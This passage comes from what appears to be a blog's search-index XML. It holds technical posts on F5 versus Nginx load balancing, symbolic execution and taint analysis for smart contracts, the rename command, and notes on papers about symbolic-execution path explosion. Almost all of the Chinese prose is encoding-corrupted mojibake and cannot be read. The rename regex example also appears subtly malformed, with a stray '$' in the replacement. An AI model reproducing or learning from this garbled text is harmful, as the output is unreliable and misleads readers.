¹æ®ä¸åŒçš„åŸŸåã€URLï¼Œå°†è®¿é—®è¯·æ±‚ä¼ é€åˆ°ä¸åŒçš„æœåŠ¡å™¨ã€‚</p><h2 id="äºŒè€…å¯¹æ¯”">äºŒè€…å¯¹æ¯”</h2><h3 id="f5ç¡¬ä»¶">F5ï¼Œç¡¬ä»¶</h3><p>ä¼˜ç‚¹ï¼šèƒ½å¤Ÿç›´æ¥é€šè¿‡æ™ºèƒ½äº¤æ¢æœºå®ç°,å¤„ç†èƒ½åŠ›æ›´å¼ºï¼Œè€Œä¸”ä¸ç³»ç»Ÿæ— å…³ï¼Œè´Ÿè½½æ€§èƒ½å¼ºï¼Œæ›´é€‚ç”¨äºä¸€å¤§å †è®¾å¤‡ã€å¤§è®¿é—®é‡ã€ç®€å•åº”ç”¨ã€‚</p><p>ç¼ºç‚¹ï¼šæˆæœ¬é«˜ï¼Œé™¤è®¾å¤‡ä»·æ ¼é«˜æ˜‚ï¼Œè€Œä¸”é…ç½®å†—ä½™ï¼Œå¾ˆéš¾æƒ³è±¡åé¢æœåŠ¡å™¨åšä¸€ä¸ªé›†ç¾¤ï¼Œä½†æœ€å…³é”®çš„è´Ÿè½½å‡è¡¡è®¾å¤‡å´æ˜¯å•ç‚¹é…ç½®ï¼Œæ— æ³•æœ‰æ•ˆæŒæ¡æœåŠ¡å™¨åŠåº”ç”¨çŠ¶æ€ã€‚</p><p>ç¡¬ä»¶è´Ÿè½½å‡è¡¡ï¼Œä¸€èˆ¬éƒ½ä¸ç®¡å®é™…ç³»ç»Ÿä¸åº”ç”¨çš„çŠ¶æ€ï¼Œè€Œåªæ˜¯ä»ç½‘ç»œå±‚æ¥åˆ¤æ–­ï¼Œæ‰€ä»¥æœ‰æ—¶å€™ç³»ç»Ÿå¤„ç†èƒ½åŠ›å·²ç»ä¸è¡Œäº†ï¼Œä½†ç½‘ç»œå¯èƒ½è¿˜æ¥å¾—åŠååº”ï¼ˆè¿™ç§æƒ…å†µéå¸¸å…¸å‹ï¼Œæ¯”å¦‚åº”ç”¨æœåŠ¡å™¨åé¢å†…å­˜å·²ç»å ç”¨å¾ˆå¤šï¼Œä½†è¿˜æ²¡æœ‰å½»åº•ä¸è¡Œï¼Œå¦‚æœç½‘ç»œä¼ è¾“é‡ä¸å¤§å°±æœªå¿…åœ¨ç½‘ç»œå±‚èƒ½åæ˜ å‡ºæ¥ï¼‰</p><h3 id="nginxè½¯è´Ÿè½½">Nginxï¼Œè½¯è´Ÿè½½</h3><p>ä¼˜ç‚¹ï¼šåŸºäºç³»ç»Ÿä¸åº”ç”¨çš„è´Ÿè½½å‡è¡¡ï¼Œèƒ½å¤Ÿæ›´å¥½åœ°æ ¹æ®ç³»ç»Ÿä¸åº”ç”¨çš„çŠ¶å†µæ¥åˆ†é…è´Ÿè½½ã€‚è¿™å¯¹äºå¤æ‚åº”ç”¨æ˜¯å¾ˆé‡è¦çš„ï¼Œæ€§ä»·æ¯”é«˜ï¼Œå®é™…ä¸Šå¦‚æœå‡ å°æœåŠ¡å™¨ï¼Œç”¨F5ä¹‹ç±»çš„ç¡¬ä»¶äº§å“æ˜¾å¾—æœ‰äº›æµªè´¹ï¼Œè€Œç”¨è½¯ä»¶å°±è¦åˆç®—å¾—å¤šï¼Œå› ä¸ºæœåŠ¡å™¨åŒæ—¶è¿˜å¯ä»¥è·‘åº”ç”¨ã€åšé›†ç¾¤ç­‰ã€‚</p><p>ç¼ºç‚¹ï¼šè´Ÿè½½èƒ½åŠ›å—æœåŠ¡å™¨æœ¬èº«æ€§èƒ½çš„å½±å“ï¼Œæ€§èƒ½è¶Šå¥½ï¼Œè´Ÿè½½èƒ½åŠ›è¶Šå¤§ã€‚</p><h2 id="ç»“è¯­">ç»“è¯­</h2><p>å…¶å®è¿˜æ˜¯å¦‚ç¬”è€…æœ€åˆè¯´åˆ°çš„ï¼Œå¦‚æœä¸å·®é’±ï¼Œå®Œå…¨å¯ä»¥ç›´æ¥ä¸Š F5ï¼ŒåŒæ—¶é…ä»¥Nginx ä½œä¸ºè´Ÿè½½å‡è¡¡åŠ webå®¹å™¨ï¼Œå¤„ç†å¤§æ•°æ®é‡çš„ç”¨æˆ·å¹¶å‘å®Œå…¨æ²¡é—®é¢˜ï¼Œå¦‚æœé¢„ç®—ä¸å¤Ÿï¼Œå…¶å® Nginxç›®å‰ä¹Ÿèƒ½æ»¡è¶³å¤§å¤šæ•°ç”¨æˆ·éœ€æ±‚äº†ï¼Œå½“ç„¶ä¹Ÿä¸èƒ½è¿·ä¿¡è´Ÿè½½å‡è¡¡ï¼Œå¯¹æˆ‘ä»¬ ITå·¥ä½œè€…æ¥è¯´çš„è¯ï¼Œç¨‹åºã€SQLç­‰æ¶‰åŠæ•°æ®å¤„ç†çš„ä¸šåŠ¡é€»è¾‘çš„åœ°æ–¹ï¼Œæ— è®ºæ˜¯æ¶æ„è¿˜æ˜¯ä»£ç äº¦æˆ–æ˜¯æ¨¡å‹çš„åˆç†æ€§ï¼Œå…¶é‡è¦æ€§æ°¸è¿œæ˜¯è¦é«˜äºä¸­é—´ä»¶çš„ï¼Œè¿™ç‚¹æƒ³å¿…æ˜¯æ¯ä½ITer çš„å…±é¸£ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¦å·æ‰§è¡Œç®€ä»‹</title>
      <link href="/blog/2021/05/30/blockchain/eth_vulns/sym_exec/"/>
      <url>/blog/2021/05/30/blockchain/eth_vulns/sym_exec/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¦å·æ‰§è¡Œ">ç¬¦å·æ‰§è¡Œ</h1><h2 id="åŸç†">åŸç†</h2><p>ç¬¦å·æ‰§è¡Œçš„å…³é”®æ€æƒ³å°±æ˜¯ï¼ŒæŠŠè¾“å…¥å˜ä¸ºç¬¦å·å€¼ï¼Œé‚£ä¹ˆç¨‹åºè®¡ç®—çš„è¾“å‡ºå€¼å°±æ˜¯ä¸€ä¸ªç¬¦å·è¾“å…¥å€¼çš„å‡½æ•°ã€‚</p><h2 id="æµç¨‹">æµç¨‹</h2><p>åæ±‡ç¼–å­—èŠ‚ç ä¸ºæ±‡ç¼–ä»£ç  å¯¹ evm æ²¡æœ‰å®ç°</p><ol type="1"><li><p>å¯¹å¾…åˆ†æçš„å•ä¸ªè¿‡ç¨‹ä»£ç å¯¹è±¡æ„å»ºæ§åˆ¶æµå›¾æ„å»ºæ§åˆ¶æµå›¾ï¼ˆControl FlowGraphï¼ŒCFGï¼‰</p><p>åœ¨é‡åˆ°åˆ†æ”¯èŠ‚ç‚¹æ—¶ï¼Œä½¿ç”¨çº¦æŸæ±‚è§£å™¨åˆ¤å®šå“ªæ¡åˆ†æ”¯å¯è¡Œï¼Œå¹¶æ ¹æ®é¢„å…ˆè®¾è®¡çš„è·¯å¾„è°ƒåº¦ç­–ç•¥å®ç°å¯¹è¯¥è¿‡ç¨‹æ‰€æœ‰è·¯å¾„çš„éå†åˆ†æ</p></li><li><p>æ„å»ºè™šæ‹Ÿæ‰§è¡Œæœºæ¨¡å‹,å¯¹æ¯æ¡è¯­å¥è§£é‡Šæ‰§è¡Œ laser-evm</p></li></ol><h2 id="åŠ¨æ€ç¬¦å·æ‰§è¡Œ">åŠ¨æ€ç¬¦å·æ‰§è¡Œ</h2><p>åŠ¨æ€ç¬¦å·æ‰§è¡Œæ˜¯ä»¥å…·ä½“æ•°å€¼ä½œä¸ºè¾“å…¥æ¥æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºä»£ç </p><h2 id="é—®é¢˜">é—®é¢˜</h2><h3 id="è·¯å¾„çˆ†ç‚¸é—®é¢˜">è·¯å¾„çˆ†ç‚¸é—®é¢˜</h3><p>ç”±äºåœ¨æ¯ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯éƒ½ä¼šäº§ç”Ÿä¸¤ä¸ªä¸åŒçº¦æŸï¼Œç¬¦å·æ‰§è¡Œè¦æ¢ç´¢çš„æ‰§è¡Œè·¯å¾„ä¾åˆ†æ”¯æ•°æŒ‡æ•°å¢é•¿ã€‚åœ¨æ—¶é—´å’Œèµ„æºæœ‰é™çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥å¯¹æœ€ç›¸å…³çš„è·¯å¾„è¿›è¡Œæ¢ç´¢ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†è·¯å¾„é€‰æ‹©çš„é—®é¢˜ã€‚é€šè¿‡è·¯å¾„é€‰æ‹©çš„æ–¹æ³•ç¼“è§£æŒ‡æ•°çˆ†ç‚¸é—®é¢˜ï¼Œä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><h2 id="æ±¡ç‚¹åˆ†æ">æ±¡ç‚¹åˆ†æ</h2><p>æ±¡ç‚¹åˆ†æå°±æ˜¯åˆ†æç¨‹åºä¸­ç”±æ±¡ç‚¹æºå¼•å…¥çš„æ•°æ®æ˜¯å¦èƒ½å¤Ÿä¸ç»æ— å®³å¤„ç†,è€Œç›´æ¥ä¼ æ’­åˆ°æ±¡ç‚¹æ±‡èšç‚¹.å¦‚æœä¸èƒ½,è¯´æ˜ç³»ç»Ÿæ˜¯ä¿¡æ¯æµå®‰å…¨çš„;å¦åˆ™,è¯´æ˜ç³»ç»Ÿäº§ç”Ÿäº†éšç§æ•°æ®æ³„éœ²æˆ–å±é™©æ•°æ®æ“ä½œç­‰å®‰å…¨é—®é¢˜.</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>rename å‘½ä»¤</title>
      <link href="/blog/2021/05/16/linux/macos/rename/"/>
      <url>/blog/2021/05/16/linux/macos/rename/</url>
      
        <content type="html"><![CDATA[<p>Ubuntu å®‰è£…: <code>sudo apt install rename</code> macOSå®‰è£…ï¼š<code>brew install rename</code></p><p><code>rename [options] 's/[filename element]/[replacement]/' [filename]</code></p><ul><li><p><code>s</code>: è¡¨ç¤ºè¿™æ˜¯æ›¿æ¢è¡¨è¾¾å¼ï¼Œæ˜¯ PCREï¼ˆPerl CompatibleRegular Expressionï¼‰-- Perl å…¼å®¹æ­£åˆ™è¡¨è¾¾å¼ -- çš„è¯­æ³•æ–¹å¼ã€‚</p></li><li></li><li></li><li></li></ul><p>ä¾‹å­ï¼š<code>rename 's/old-name/new-name/' files</code></p><p>åˆ©ç”¨ <code>rename 's/\.txt$/\.pdf$/' *.txt</code>å‘½ä»¤å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰åç¼€åä¸º <code>.txt</code> çš„æ–‡ä»¶é‡å‘½åä»¥<code>.pdf</code> ä¸ºåç¼€åçš„æ–‡ä»¶ã€‚</p><p>å…¶ä¸­ 's/old-name/new-name/' æ˜¯ PCREï¼ˆPerl Compatible RegularExpressionï¼‰-- Perl å…¼å®¹æ­£åˆ™è¡¨è¾¾å¼ -- çš„è¯­æ³•æ–¹å¼ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://learnku.com/server/wikis/36532">Linuxæ–‡ä»¶ç®¡ç†ï¼šLinux rename å‘½ä»¤ï¼ˆé‡å‘½åç›®å½•å’Œæ–‡ä»¶ï¼‰ | Serverè¿ç»´è®ºå›</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> macos </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Symbolic Execution Optimization</title>
      <link href="/blog/2021/04/30/blockchain/eth_vulns/sym_exe_optimization/"/>
      <url>/blog/2021/04/30/blockchain/eth_vulns/sym_exe_optimization/</url>
      
        <content type="html"><![CDATA[<h1 id="symbolic-execution-optimization">Symbolic ExecutionOptimization</h1><p>ç¬¦å·æ‰§è¡Œè¿‡ç¨‹:</p><pre><code>è·å–å­—èŠ‚ç å’Œæºæ–‡ä»¶åæ±‡ç¼–æ§åˆ¶æµå›¾ç¬¦å·æ‰§è¡Œz3 æ±‚è§£å™¨æ±‚è§£æ£€æµ‹æ¼æ´</code></pre><p>ç¬¦å·æ‰§è¡ŒåŒ…æ‹¬ä¸¤ä¸ªé‡è¦æ¨¡å—, åˆ†åˆ«æ˜¯æµ‹è¯•ç”¨ä¾‹é€‰æ‹©å’Œè·¯å¾„çº¦æŸæ¡ä»¶æ±‚è§£,å‰è€…å…³ç³»åˆ°èƒ½å¦å‘ç°æ¼æ´ã€æµ‹è¯•è¦†ç›–ç‡å’Œæµ‹è¯•ä»£ç æ·±åº¦, åè€…ç”¨äºäº§ç”Ÿæµ‹è¯•ç”¨ä¾‹,å¤§é‡çš„çº¦æŸæ¡ä»¶æ±‚è§£æå¤§å½±å“äº†ç¬¦å·æ‰§è¡Œæ€§èƒ½</p><p>ç¬¦å·æ‰§è¡Œé¢ä¸´çš„ä¸‰å¤§éš¾ç‚¹ï¼šè·¯å¾„çˆ†ç‚¸é—®é¢˜ã€ç¬¦å·æ‰§è¡Œç²¾ç¡®æ€§é—®é¢˜å’Œå¤æ‚ç¬¦å·çº¦æŸæ±‚è§£ä¼˜åŒ–é—®é¢˜</p><h2 id="solutions">Solutions</h2><p>ä¸¤ç§æ€è·¯:</p><p>æ€è·¯ä¸€: é€šè¿‡æŸäº›æ–¹æ³•æˆ–æŠ€æœ¯ç›´æ¥å¯¹ç¬¦å·æ‰§è¡Œæœ¬èº«ã€æŸä¸ªæ­¥éª¤è¿›è¡Œæ”¹è¿›</p><p>æ€è·¯äºŒ: é€šè¿‡å’Œå…¶ä»–æŠ€æœ¯ç»“åˆï¼Œç›¸äº’å¼¥è¡¥ç¼ºç‚¹ï¼Œæœ€ç»ˆè¾¾åˆ°æ¯”è¾ƒå¥½çš„ç»“æœ</p><p>æ€è·¯ä¸‰:ç»“åˆè¦æ£€æµ‹çš„ä¸œè¥¿(å³ï¼šæ™ºèƒ½åˆçº¦)çš„ç‰¹ç‚¹ï¼Œå¯¹ç¬¦å·æ‰§è¡Œè¿›è¡Œç‰¹å®šçš„æ”¹è¿›</p><h2 id="æ€è·¯ä¸€">æ€è·¯ä¸€</h2><h3 id="è·¯å¾„çˆ†ç‚¸path-explosionè·¯å¾„æœç´¢è¦†ç›–">è·¯å¾„çˆ†ç‚¸(PathExplosion)/è·¯å¾„æœç´¢(è¦†ç›–)</h3><h4 id="æè¿°">æè¿°</h4><p>æ‰€è°“è·¯å¾„çˆ†ç‚¸é—®é¢˜æ˜¯æŒ‡ç¬¦å·æ‰§è¡Œå¾ˆéš¾éå†ç¨‹åºçš„æ‰€æœ‰æ‰§è¡Œè·¯å¾„(ç‰¹åˆ«æ˜¯é‡åˆ°å¾ªç¯åˆ†æ”¯æ—¶)ï¼Œäº§ç”Ÿè¿™ä¸ªé—®é¢˜ä¸»è¦æœ‰ä¸¤ä¸ªæ–¹é¢çš„åŸå› ï¼š</p><ol type="1"><li>éšç€ç¨‹åºè§„æ¨¡çš„å¢å¤§ï¼Œç¨‹åºçš„å¯è¡Œè·¯å¾„å‘ˆç°æŒ‡æ•°çº§å¢é•¿ï¼›</li><li>ç¬¦å·æ‰§è¡Œåœ¨éå†æ¯æ¡è·¯å¾„çš„æ—¶å€™éƒ½éœ€è¦å¤§é‡çš„è®¡ç®—èµ„æºã€‚</li></ol><p>åœ¨æœ‰é™çš„æµ‹è¯•æ—¶é—´å’Œé‡‘é’±çš„æ¡ä»¶ä¸‹ï¼Œç¬¦å·æ‰§è¡Œä¸å¯èƒ½å®Œæˆå¯¹æ‰€æœ‰çš„å¯è¡Œè·¯å¾„è¿›è¡Œéå†ã€‚è€Œåœ¨æœ‰æ•ˆçš„è®¡ç®—èµ„æºæ¡ä»¶ä¸‹ï¼Œå¦‚ä½•è®¾è®¡ä¸€ä¸ªæœ‰æ•ˆçš„è·¯å¾„æœç´¢ç­–ç•¥å°±æˆäº†å‡è½»è·¯å¾„çˆ†ç‚¸é—®é¢˜çš„å…³é”®ã€‚</p><h4 id="è§£å†³">è§£å†³</h4><p>ä¸»è¦æœ‰ 2 ä¸ªæ–¹é¢ç ”ç©¶:</p><h5 id="æœç´¢çº¦æŸ">æœç´¢çº¦æŸ</h5><p>æœç´¢çº¦æŸå³å¯¹ç¨‹åºçš„è¾“å…¥è¿›è¡Œå»ºæ¨¡ï¼Œæˆ–ä»¥ç›®æ ‡ä½ç½®ä¸ºå¯¼å‘æ’é™¤æ— å…³è·¯å¾„ã€‚è¿™ç±»æ–¹æ³•æ˜¯é€šè¿‡çº¦æŸå¯¹æœç´¢è·¯å¾„è¿›è¡Œè£å‰ªï¼Œä»è€Œè¾¾åˆ°é™ä½å¤æ‚åº¦çš„ç›®çš„ã€‚</p><p>æœç´¢çº¦æŸé¢å‘ç‰¹å®šç±»å‹/ç»“æ„æ—¶ï¼Œä¾‹å¦‚ï¼šå¯¹å¾ªç¯å¯è¾¾ä¸Šç•Œè¿›è¡Œçº¦æŸç­‰</p><p>æœç´¢çº¦æŸé¢å‘ç‰¹å®šç±»å‹çš„ç¨‹åºæˆ–è€…ç›®æ ‡æ—¶ï¼Œèƒ½å¤Ÿå¤§å¹…åœ°è£å‰ªè·¯å¾„ï¼Œä¾‹å¦‚åŸºäºæ–‡æ¡£è¾…åŠ©å¯¹è¾“å…¥å»ºæ¨¡ï¼Œè¯¥æ–¹æ³•ä»å¸®åŠ©æ–‡æ¡£ã€ä»£ç æ³¨é‡ŠåŠæ–‡ä»¶æ ¼å¼ä¸­æå–æ›´å¤šçš„æœç´¢çº¦æŸï¼Œå¸®åŠ©æ‰‹å†Œæ ¼å¼ï¼ˆmanualï¼‰çš„å‚æ•°çº¦æŸä»¥åŠç‰¹æ®Šçš„æ–‡ä»¶æ ¼å¼ï¼Œå¦‚å¯æ‰§è¡Œå’Œå¯é“¾æ¥æ ¼å¼ï¼ˆELF,executable and linking formatï¼‰ã€‚</p><p>ç„¶è€Œè¯¥æ–¹æ³•ä¹Ÿå¾ˆæœ‰å±€é™æ€§ï¼Œæ¯”å¦‚éœ€è¦ç¨‹åºå¸¦æœ‰å¸®åŠ©æ‰‹å†Œï¼ŒåŒæ—¶ç¬¦åˆè§£æçš„è§„èŒƒã€‚å¦‚æœä¸€ä¸ªç¨‹åºç¼ºå°‘å¿…è¦ä¿¡æ¯ï¼Œæ¯”å¦‚ç¼ºå°‘å¸®åŠ©æ–‡æ¡£ï¼Œåˆ™æ— æ³•ä½¿ç”¨è¯¥æ–¹æ³•ã€‚æ‰€ä»¥è¯¥æ–¹æ³•å¾ˆéš¾é€‚ç”¨äºæ‰€æœ‰çš„å¼€æºç¨‹åºï¼Œå°¤å…¶æ˜¯ä¸€äº›ç¼ºä¹ç»´æŠ¤çš„å¼€æºç¨‹åºã€‚</p><ol type="1"><li><p><ahref="http://www.infocomm-journal.com/txxb/CN/10.11959/j.issn.1000-436x.2019062">2019_åŸºäºè¾“å…¥çº¦æŸçš„ç¬¦å·æ‰§è¡Œä¼˜åŒ–</a></p><p>æœ¬æ–‡æå‡ºäº†ä¸€ç§æ–°çš„åŸºäºè¾“å…¥çº¦æŸçš„ç¬¦å·æ‰§è¡Œï¼ˆICBSEï¼Œinput constraintbasedsymbolic executionï¼‰ä¼˜åŒ–æ¡†æ¶é€šè¿‡æå–ä»£ç ä¸­æœ‰æ•ˆçš„å‘½ä»¤è¡Œçº¦æŸå‚æ•°ï¼ˆæ¯”å¦‚ rm å‘½ä»¤ä¸­çš„-ré€‰é¡¹ï¼‰ï¼Œä»è€Œå®ç°å¯¹æœç´¢è·¯å¾„çš„è£å‰ªã€‚</p><p><em>è§è®ºæ–‡ç¬¬äºŒé¡µ</em></p></li><li><p><ahref="http://cdmd.cnki.com.cn/Article/CDMD-10284-1016142033.htm">ç¬¦å·æ‰§è¡Œåˆ¶å¯¼æŠ€æœ¯åŠå…¶åº”ç”¨ç ”ç©¶_2016</a></p><p>è¿™ä¸ªæ¯”è¾ƒåŸºç¡€çœ‹çœ‹é¢˜ç›®å°±å¥½æå‡ºç‰¹å®šç›®æ ‡åˆ¶å¯¼ä¸å¾ªç¯å¯è¾¾ä¸Šç•Œåˆ¶å¯¼ç›¸ç»“åˆçš„ç¬¦å·æ‰§è¡Œåˆ¶å¯¼æŠ€æœ¯</p></li></ol><h5 id="æœç´¢ç­–ç•¥">æœç´¢ç­–ç•¥</h5><p>ç¬¦å·æ‰§è¡Œä¸­çš„é€šç”¨æœç´¢ç­–ç•¥å¸Œæœ›åœ¨æœ‰é™èµ„æºå†…è¦†ç›–æ›´å¤šçš„ç¨‹åºè¯­å¥æˆ–è·¯å¾„ï¼ŒåŒ…æ‹¬æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆdepth-firstsearchï¼ŒDFSï¼‰ã€éšæœºçŠ¶æ€æœç´¢ï¼ˆrandom statesearchï¼ŒRSSï¼‰ã€éšæœºè·¯å¾„æœç´¢ï¼ˆrandom pathsearchï¼ŒRPSï¼‰ä»¥åŠè¦†ç›–ç‡ä¼˜åŒ–æœç´¢ï¼ˆcoverage-optimized searchï¼ŒCOSï¼‰ç­‰ï¼›ä¹Ÿæœ‰ä¸€äº›å·¥ä½œé’ˆå¯¹æŸä¸ªå…·ä½“ç›®æ ‡ç ”ç©¶é«˜æ•ˆçš„è·¯å¾„ç©ºé—´æœç´¢ç­–ç•¥ï¼ŒåŒ…æ‹¬æé«˜ç¨‹åºè¯­å¥è¦†ç›–ç‡ã€é¢å‘å¯è¾¾æ€§çš„æœç´¢ç­–ç•¥[ã€é¢å‘ç¨‹åºä¸åŒç‰ˆæœ¬å·®å¼‚çš„æœç´¢ç­–ç•¥ç­‰.</p><p>æœç´¢ç­–ç•¥çš„æ”¹è¿›å’Œä¸€äº›å‰ªæä¸ä¼˜åŒ–</p><p>è§„å®šæ¯ä¸ªè¿‡ç¨‹å†…çš„åˆ†æè·¯å¾„çš„æ•°ç›®ä¸Šé™ã€è®¾ç½®æ—¶é—´ä¸Šé™å’Œå†…å­˜ä¸Šé™ç­‰æ¥è¿›è¡Œç¼“è§£ã€‚å„ç§è·¯å¾„åˆ¶å¯¼æŠ€æœ¯ã€è·¯å¾„å‰ªæã€å¾ªç¯ä¼˜åŒ–ç­‰æ–¹é¢çš„å·¥ä½œ.ç°æœ‰çš„åˆ¶å¯¼æŠ€æœ¯ä»¥åŠè·¯å¾„å‰ªæåˆ†åˆ«å…³æ³¨äºæå‡ºæ–°çš„è·¯å¾„åˆ†æ”¯é€‰æ‹©ç­–ç•¥æˆ–è€…ä¿®å‰ªæ¢ç´¢è¿‡çš„è·¯å¾„</p><ol type="1"><li><p><ahref="http://gb.oversea.cnki.net/KCMS/detail/detailall.aspx?filename=1018707954.nh&amp;dbcode=CMFD&amp;dbname=CMFDREF">2018_å¹¶è¡Œåˆ†æ®µå¼ç¬¦å·æ‰§è¡Œçš„ç ”ç©¶ä¸å®ç°</a></p><p>æœ¬æ–‡é¦–å…ˆä¼˜åŒ–äº†åŠ¨æ€æ‰§è¡Œå¼•æ“ Angr çš„è·¯å¾„æœç´¢ç®—æ³•ã€‚é€šè¿‡å¯¹ Angræºç çš„æ·±å…¥åˆ†æ,æå‡ºäº†ä¼˜åŒ–å…¶è·¯å¾„é€‰æ‹©ç­–ç•¥çš„æ€æƒ³æå‡ºäº†ä¸¤ç§å¹¶è¡Œåˆ†æ®µå¼è·¯å¾„æœç´¢ç®—æ³•:åˆ†å‰²å¼å¹¶è¡ŒåŒ–ç®—æ³•å’ŒåŸºäº pipelineçš„å¹¶è¡ŒåŒ–ç®—æ³•ã€‚ <em>è§è®ºæ–‡æ‘˜è¦</em></p><p>ä¸‹é¢çš„ 2, 3 æ¡æ˜¯å¯å‘å¼æœç´¢</p></li><li><p><a href="https://ieeexplore.ieee.org/document/8356902">PathExploration Based on Monte Carlo Tree Search for SymbolicExecution</a></p><p>We therefore propose novel strategies that only require limitedresources to give priority to more valuable paths. We utilize a methodbased on the Monte Carlo tree search(MCTS) strategy to resolve theproblem. We then compare the proposed MCTS-based strategy with othermethodsthen such as depth-first search (DFS) and breadth-firstsearch(BFS). MCTS is a heuristic search algorithmè¿™ä¸ªå’Œä¸‹é¢é‚£ä¸ªéƒ½æ˜¯</p></li><li><p><a href="https://dl.acm.org/doi/10.1145/3180155.3180251">Choppedsymbolic execution_2018</a></p><p>allows users to specify uninteresting parts of the code to excludeduring the analysis, thus only targeting the exploration to paths ofimportance.</p><p>However, the excluded parts are not summarily ignored, as this maylead to both false positives and false negatives. Instead, they areexecuted lazily, when their effect may be observable by code underanalysis.</p><p>Chopped symbolic execution leverages various on-demandstatic analysesat runtime to automatically exclude code fragmentswhile resolving theirside effects, thus avoiding expensive manualannotations andimprecision.</p></li><li><p><ahref="http://crad.ict.ac.cn/CN/10.7544/issn1000-1239.2016.20148330">åŸºäºæ±‚è§£å¼€é”€é¢„æµ‹çš„ç¬¦å·æ‰§è¡Œæœç´¢ç­–ç•¥_æ¥æº:è®¡ç®—æœºç ”ç©¶ä¸å‘å±•</a></p><p>è¿™ä¸ªè®ºæ–‡ä¸æ˜¯è§£å†³ Path Explosioné—®é¢˜ï¼Œè€Œæ˜¯<strong>åŸºäºçº¦æŸæ±‚è§£é¢„æµ‹çš„ä¸€ç§æœç´¢ç­–ç•¥</strong>ã€‚ç¬¦å·æ‰§è¡Œä¸­ç°æœ‰æœç´¢ç­–ç•¥åœ¨çº¦æŸæ±‚è§£æ–¹é¢çš„è€ƒè™‘ä¸å¤Ÿï¼Œè€Œç¬¦å·æ‰§è¡Œä¸­å¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´å¼€é”€èŠ±åœ¨çº¦æŸæ±‚è§£ä¸Š.</p><p>ç°æœ‰çš„ç¬¦å·æ‰§è¡Œæœç´¢ç­–ç•¥åœ¨è¿›è¡Œè·¯å¾„é€‰æ‹©æ—¶éƒ½æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´ç¬¦å·æ‰§è¡Œåœ¨åˆ†æå¤æ‚è¿ç®—ç¨‹åºæ—¶æ— æ³•åœ¨æœ‰é™çš„æ—¶é—´å†…æ¢ç´¢æ›´å¤šçš„ç¨‹åºè·¯å¾„ï¼Œä»è€Œåˆ¶çº¦äº†ç¬¦å·æ‰§è¡Œæ¢ç´¢è·¯å¾„ç©ºé—´çš„èƒ½åŠ›.</p><p>é’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œæœ¬æ–‡æå‡ºäº†ä¸€ç§åŸºäºæ±‚è§£å¼€é”€é¢„æµ‹çš„ç¬¦å·æ‰§è¡Œæœç´¢ï¼ˆsolvingcost predication basedsearchï¼ŒSCPSï¼‰ç­–ç•¥ï¼Œé€šè¿‡å¯¹ç¬¦å·æ‰§è¡Œä¸­çš„æ±‚è§£å¼€é”€è¿›è¡Œç»éªŒé¢„æµ‹ï¼Œåœ¨å…¼é¡¾ç¨‹åºè¯­å¥è¦†ç›–ç‡çš„å‰æä¸‹ï¼Œä¼˜å…ˆé€‰æ‹©æ±‚è§£å¼€é”€å°çš„è·¯å¾„è¿›è¡Œæ¢ç´¢ï¼Œä»è€Œå¯åœ¨æœ‰é™æ—¶é—´å†…æé«˜æ¢ç´¢è·¯å¾„çš„æ•°é‡.æœ¬æ–‡åœ¨å¼€æºç¬¦å·æ‰§è¡Œå™¨ KLEE ä¸Šå®ç°äº† SCPSï¼Œå¹¶åœ¨å¼€æºç¨‹åºä¸Šå¼€å±•äº†å®éªŒ</p><p>åŸºäºå®éªŒæ€»ç»“å‡ºäº†åº¦é‡çº¦æŸå¤æ‚åº¦çš„ç»éªŒå…¬å¼ï¼Œå¹¶ç»“åˆçº¦æŸçš„å†å²æ±‚è§£å¼€é”€æ¥é¢„æµ‹å½“å‰çš„æ±‚è§£å¼€é”€ï¼Œä»è€Œåœ¨ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼˜å…ˆæ¢ç´¢æ±‚è§£å¼€é”€è¾ƒå°çš„è·¯å¾„.åœ¨ KLEE ä¸­å®ç°äº†ä¸Šè¿°æœç´¢ç­–ç•¥ï¼Œ</p></li><li><p><a href="https://arxiv.org/pdf/1907.09700.pdf">Enhancing DynamicSymbolic Execution by Automatically Learning Search Heuristics</a></p><p>A key challenge indynamic symbolic execution is how to effectivelyexplore the programâ€™s execution paths to achieve high code coverage in alimited timebudget. Dynamic symbolic execution employs a searchheuristic to address this challenge.</p><p>Howeverï¼Œmanually designing a good search heuristic is nontrivial andtypically ends up with suboptimal and unstable outcomes</p><p>The goal of this paper is to overcome this shortcoming of dynamicsymbolic execution by automatically learning search heuristics. Wedefine a class of search heuristics, namely a parametric searchheuristic, and present an algorithm that efficiently finds an optimalheuristic for each subject program.</p></li></ol><h3 id="æµ‹è¯•ç”¨ä¾‹ç²¾ç¡®è¦†ç›–è·¯å¾„é—®é¢˜">æµ‹è¯•ç”¨ä¾‹ç²¾ç¡®è¦†ç›–è·¯å¾„é—®é¢˜</h3><p>ä¸Šè¿°å…³äºç¬¦å·æ‰§è¡Œçš„ä¼˜åŒ–æ–¹æ³•åœ¨ä¸€å®šç¨‹åº¦ä¸Šéƒ½èƒ½å¤Ÿå‡å°‘è·¯å¾„åˆ†æ”¯å¹¶æé«˜ä»£ç 